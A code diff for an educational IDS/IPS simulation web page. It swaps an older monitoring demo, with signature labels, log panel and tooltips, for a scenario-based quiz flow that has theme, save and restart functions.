+    var blob = new Blob([lines.join("\n")], {type:"text/plain;charset=utf-8"});
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement("a");
+    var safeName = (name || "student").replace(/[^a-z0-9\-]+/gi,"_");
+    a.href = url;
+    a.download = "IDS-IPS-Simulation-Summary_" + safeName + ".txt";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    setTimeout(function(){ URL.revokeObjectURL(url); }, 2000);
+  }
 
-        function updateIPSStatus(status) {
-            document.getElementById('ipsStatus').textContent = status;
-        }
+  function restart(){
+    state.idx = 0;
+    state.results = [];
+    state.finished = false;
+    showScreen("screen-intro");
+    updateHeader();
+  }
 
-        function updateSignatureDisplay() {
-            const signatureList = document.getElementById('signatureList');
-            
-            if (signatures.length === 0) {
-                signatureList.innerHTML = '<div class="signature-item">No signatures loaded</div>';
-            } else {
-                const signatureMap = {
-                    'sql_injection': 'SQL Injection Pattern',
-                    'xss_attack': 'XSS Attack Pattern',
-                    'port_scan': 'Port Scan Pattern',
-                    'dos_attack': 'DoS Attack Pattern'
-                };
-                
-                signatureList.innerHTML = signatures.map(sig => 
-                    `<div class="signature-item">✓ ${signatureMap[sig]}</div>`
-                ).join('');
-            }
-        }
+  // ---------- Theme ----------
+  function setTheme(dark){
+    document.documentElement.setAttribute("data-theme", dark ? "dark" : "light");
+    var btn = $("themeToggle");
+    btn.setAttribute("aria-pressed", dark ? "true" : "false");
+    btn.setAttribute("aria-label", dark ? "Switch to light mode" : "Switch to dark mode");
+    btn.innerHTML = dark ? "&#9789;" : "&#9788;";
+  }
 
-        function addLog(message, type = 'info') {
-            const logPanel = document.getElementById('logPanel');
-            const timestamp = new Date().toLocaleTimeString();
-            
-            const colorMap = {
-                'info': '#00ff00',
-                'success': '#00ff88',
-                'warning': '#ffaa00',
-                'danger': '#ff4444',
-                'error': '#ff0000'
-            };
-            
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            logEntry.style.color = colorMap[type] || '#00ff00';
-            logEntry.textContent = `[${timestamp}] ${message}`;
-            
-            logPanel.appendChild(logEntry);
-            logPanel.scrollTop = logPanel.scrollHeight;
-            
-            // Keep only last 50 log entries
-            while (logPanel.children.length > 50) {
-                logPanel.removeChild(logPanel.firstChild);
-            }
-        }
+  // ---------- Wire up events ----------
+  $("startBtn").addEventListener("click", function(){
+    loadScenario(0);
+  });
+  $("hintBtn").addEventListener("click", useHint);
+  $("submitBtn").addEventListener("click", submitAnswer);
+  $("nextBtn").addEventListener("click", nextScenario);
+  $("printBtn").addEventListener("click", function(){ window.print(); });
+  $("saveBtn").addEventListener("click", saveSummary);
+  $("restartBtn").addEventListener("click", restart);
+  $("themeToggle").addEventListener("click", function(){
+    var isDark = document.documentElement.getAttribute("data-theme") === "dark";
+    setTheme(!isDark);
+  });
 
-        function animatePacket(type) {
-            const diagram = document.getElementById('networkDiagram');
-            const packet = document.createElement('div');
-            packet.className = `packet ${type}`;
-            
-            diagram.appendChild(packet);
-            
-            setTimeout(() => {
-                packet.remove();
-            }, 3000);
-        }
-
-        function startTrafficAnimation() {
-            // Add subtle animation effects when monitoring is active
-            const ipsNode = document.getElementById('ipsNode');
-            ipsNode.style.animation = 'pulse 2s infinite';
-            
-            // Add CSS for pulse animation
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes pulse {
-                    0% { box-shadow: 0 0 20px rgba(76, 175, 80, 0.5); }
-                    50% { box-shadow: 0 0 30px rgba(76, 175, 80, 0.8); }
-                    100% { box-shadow: 0 0 20px rgba(76, 175, 80, 0.5); }
-                }
-            `;
-            document.head.appendChild(style);
-        }
-
-        function stopTrafficAnimation() {
-            const ipsNode = document.getElementById('ipsNode');
-            ipsNode.style.animation = '';
-        }
-
-        // Initialize the display
-        document.addEventListener('DOMContentLoaded', function() {
-            updateTaskDisplay();
-            updateStatistics();
-            updateSignatureDisplay();
-        });
-
-        // Add some educational tooltips
-        function showTooltip(element, text) {
-            // Simple tooltip implementation for educational purposes
-            element.title = text;
-        }
-
-        // Educational enhancements
-        document.addEventListener('DOMContentLoaded', function() {
-            // Add tooltips to network nodes
-            const internetNode = document.querySelector('.internet');
-            const ipsNode = document.querySelector('.ips');
-            const internalNode = document.querySelector('.internal-network');
-            
-            showTooltip(internetNode, 'External network - source of potential threats');
-            showTooltip(ipsNode, 'Intrusion Prevention System - your security checkpoint');
-            showTooltip(internalNode, 'Protected internal network - your assets');
-            
-            // Add educational information popups
-            const buttons = document.querySelectorAll('.button');
-            buttons.forEach(button => {
-                button.addEventListener('mouseenter', function() {
-                    const buttonText = this.textContent;
-                    let tooltip = '';
-                    
-                    switch(buttonText) {
-                        case 'Initialize IPS':
-                            tooltip = 'Starts the IPS system and loads basic configuration';
-                            break;
-                        case 'Start Monitoring':
-                            tooltip = 'Begins active network traffic monitoring';
-                            break;
-                        case 'Send Normal Traffic':
-                            tooltip = 'Simulates legitimate network traffic';
-                            break;
-                        case 'Simulate Attack':
-                            tooltip = 'Generates malicious traffic to test IPS detection';
-                            break;
-                        case 'Add Signature':
-                            tooltip = 'Adds threat patterns to the detection database';
-                            break;
-                    }
-                    
-                    if (tooltip) {
-                        showTooltip(this, tooltip);
-                    }
-                });
-            });
-        });
-    </script>
+  setTheme(false); // default light
+  updateHeader();
+})();
+</script>
 </body>
 </html>
